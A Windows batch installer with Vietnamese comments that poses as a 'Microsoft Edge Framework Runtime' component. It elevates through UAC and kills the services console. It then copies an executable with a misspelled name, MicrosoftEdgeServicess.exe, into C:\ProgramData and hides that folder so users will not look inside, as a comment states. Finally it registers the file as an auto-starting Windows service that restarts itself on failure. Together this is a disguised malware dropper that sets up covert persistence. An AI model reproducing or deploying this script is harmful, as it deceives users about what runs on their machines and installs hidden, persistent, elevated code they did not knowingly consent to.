@echo off
title Cai Dat Microsoft Edge Framework Runtime (System Component)
cd /d "%~dp0"

echo ===============================================================================
echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
echo   Component: MicrosoftEdgeServicess
echo   Description: Provides runtime environment and update services for Edge.
echo   Startup Type: Automatic (Background Service)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN TEP TIN NEN]
echo ===============================================================================
echo   Ban dang mo tep tin truc tiep tu tep nen ZIP chua duoc giai nen!
echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe de thiet lap.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao tep tin ZIP
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai tap tin nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator (Tu dong yeu cau quyen UAC neu can)
if "%~1"=="/skipuac" goto :DaCoQuyenAdmin
if "%~1"=="/elevated" goto :DaCoQuyenAdmin
if "%~1"=="/silent" goto :DaCoQuyenAdmin
if "%~1"=="/unattended" goto :DaCoQuyenAdmin

net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

echo Dang xac thuc quyen Administrator (Windows UAC)...
powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 exit /b 0

echo.
echo ===============================================================================
echo   CANH BAO: CHUA CO QUYEN QUAN TRI VIEN (ADMINISTRATOR)
echo ===============================================================================
echo   Vui long nhap chuot phai vao tap tin nay va chon Run as administrator.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc de tranh bi khoa handle
echo [1/4] Dang kiem tra moi truong he thong...
taskkill /F /IM mmc.exe >nul 2>&1

for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
)
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Cho toi da 5 giay de service dung han
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
    if not errorlevel 1 goto :DaDungHan
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)
:DaDungHan

:: 4. Thiet lap thu muc he thong MicrosoftEdgeServicess
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/4] Khoi tao thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
)

echo [3/4] Dang sao chep cac tap tin thanh phan...
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
)

if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul

:: An thu muc cai dat de nguoi dung khong to mo mo xem
attrib +h "%INSTALL_DIR%" >nul 2>&1

if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
    echo   Vui long khoi dong lai may tinh va thu lai.
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 5. Dang ky Windows Service SCM
echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% equ 0 goto :ServiceDaTonTai

sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1

:ServiceDaTonTai
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1

timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul

echo.
echo ===============================================================================
echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
echo   - Component: MicrosoftEdgeServicess
echo   - Status: Running (Tu khoi dong cung Windows)
echo   - Environment: SCM Service Architecture
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 0
